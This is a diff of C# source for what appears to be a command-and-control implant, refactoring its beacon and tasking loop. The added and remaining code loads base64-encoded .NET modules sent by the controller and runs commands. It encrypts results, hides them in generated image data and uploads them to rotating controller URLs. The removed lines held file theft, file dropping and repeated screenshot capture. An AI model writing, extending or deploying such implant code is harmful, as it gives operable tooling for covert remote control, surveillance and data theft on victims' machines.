@@ -387,7 +387,29 @@ public class Program
 			return ImageBytesFull;
 		}
 	}
-	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
+
+    static void Exec(string cmd, string taskId, string key, byte[] encByte = null) {
+		var eTaskId = Encryption(key, taskId);
+		var dcoutput = "";
+		if (encByte != null)
+			dcoutput = Encryption(key, null, true, encByte);
+		else
+			dcoutput = Encryption(key, cmd, true);
+		var doutputBytes = System.Convert.FromBase64String(dcoutput);
+		var dsendBytes = ImgGen.GetImgData(doutputBytes);
+
+		var attempts = 0;
+    	while (attempts < 5) {
+    		attempts += 1;
+			try 
+			{
+				GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+				attempts = 5;
+			} catch	{}
+		}
+	}
+
+    static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
 		ImgGen.Init(stringIMGS);
@@ -433,80 +455,19 @@ public class Program
 					var split = splitcmd.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
 					foreach (string c in split)
 					{
-						var taskId = c.Substring(0, 5);
+						Program.taskId = c.Substring(0, 5);
 						cmd = c.Substring(5, c.Length - 5);
 						if (cmd.ToLower().StartsWith("exit"))
 						{
 							exitvt.Set();
 							break;
-						}
+						}						
 						else if (cmd.ToLower().StartsWith("loadmodule"))
 						{
 							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
 							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
-						}
-						else if (cmd.ToLower().StartsWith("upload-file"))
-						{
-							var path = Regex.Replace(cmd, "upload-file", "", RegexOptions.IgnoreCase);
-							var splitargs = path.Split(new string[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
-							Console.WriteLine("Uploaded file to: " + splitargs[1]);
-							var fileBytes = Convert.FromBase64String(splitargs[0]);
-							System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
-						}
-						else if (cmd.ToLower().StartsWith("download-file"))
-						{
-							var path = Regex.Replace(cmd, "download-file ", "", RegexOptions.IgnoreCase);
-							var file = File.ReadAllBytes(path.Replace("\"", ""));
-							var fileChuck = Combine(Encoding.ASCII.GetBytes("0000100001"), file);
-	
-							var eTaskId = Encryption(Key, taskId);
-							var dcoutput = Encryption(Key, "", true, fileChuck);
-							var doutputBytes = System.Convert.FromBase64String(dcoutput);
-							var dsendBytes = ImgGen.GetImgData(doutputBytes);
-							GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
-							continue;
-						}
-						else if (cmd.ToLower().StartsWith("get-screenshotmulti"))
-						{
-							bool sShot = true;
-							int sShotCount = 1;
-							while(sShot) {
-								var sHot = rAsm("run-exe Core.Program Core get-screenshot");
-								var eTaskId = Encryption(Key, taskId);
-								var dcoutput = Encryption(Key, strOutput.ToString(), true);
-								var doutputBytes = System.Convert.FromBase64String(dcoutput);
-								var dsendBytes = ImgGen.GetImgData(doutputBytes);
-								GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
-								Thread.Sleep(240000);
-								sShotCount++;
-								if (sShotCount > 100) {
-									sShot = false;
-									var sbc = strOutput.GetStringBuilder();
-									sbc.Remove(0, sbc.Length);
-									output.Append("[+] Multi Screenshot Ran Sucessfully");
-								}
-							}
-							continue;
-						}
-						else if (cmd.ToLower().StartsWith("get-screenshot"))
-						{
-							var sHot = rAsm("run-exe Core.Program Core get-screenshot");
-							var eTaskId = Encryption(Key, taskId);
-							var dcoutput = Encryption(Key, strOutput.ToString(), true);
-							var doutputBytes = System.Convert.FromBase64String(dcoutput);
-							var dsendBytes = ImgGen.GetImgData(doutputBytes);
-							GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
-							var sbc = strOutput.GetStringBuilder();
-							sbc.Remove(0, sbc.Length);
-							continue;
-						}
-						else if (cmd.ToLower().StartsWith("listmodules"))
-						{
-							var appd = AppDomain.CurrentDomain.GetAssemblies();
-							output.AppendLine("[+] Modules loaded:").AppendLine("");
-							foreach (var ass in appd)
-							output.AppendLine(ass.FullName.ToString());
-						}
+							Exec(output.ToString(), taskId, Key);
+						}						
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
 							output.AppendLine(rAsm(cmd));
@@ -519,29 +480,32 @@ public class Program
 							{
 								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
 							}
-							else
+							else 
+							{
 								output.AppendLine(String.Format(@"[X] Invalid time ""{0}""", c));
+							}
+							Exec("Beacon set", taskId, Key);
 						}
-	
+						else 
+						{
+							var sHot = rAsm($"run-exe Core.Program Core {cmd}");							
+						}	
 						output.AppendLine(strOutput.ToString());
 						var sb = strOutput.GetStringBuilder();
 						sb.Remove(0, sb.Length);
-						var enTaskId = Encryption(Key, taskId);
-						var coutput = Encryption(Key, output.ToString(), true);
-						var outputBytes = System.Convert.FromBase64String(coutput);
-						var sendBytes = ImgGen.GetImgData(outputBytes);
-						GetWebRequest(enTaskId).UploadData(UrlGen.GenerateUrl(), sendBytes);
+						if (output.Length > 2)
+							Exec(output.ToString(), taskId, Key);
+							output.Length = 0;
 					}
 				}
 			}
+			catch (NullReferenceException e) {}
+			catch (WebException e) {}
 			catch (Exception e)
 			{
-				var task = Encryption(Key, "Error");
-				var eroutput = Encryption(Key, String.Format("Error: {0} {1}", output.ToString(), e), true);
-				var outputBytes = System.Convert.FromBase64String(eroutput);
-				var sendBytes = ImgGen.GetImgData(outputBytes);
-				GetWebRequest(task).UploadData(UrlGen.GenerateUrl(), sendBytes);
+				Exec(String.Format("Error: {0} {1}", output.ToString(), e), "Error", Key);
 			}
 		}
 	}
 }
+
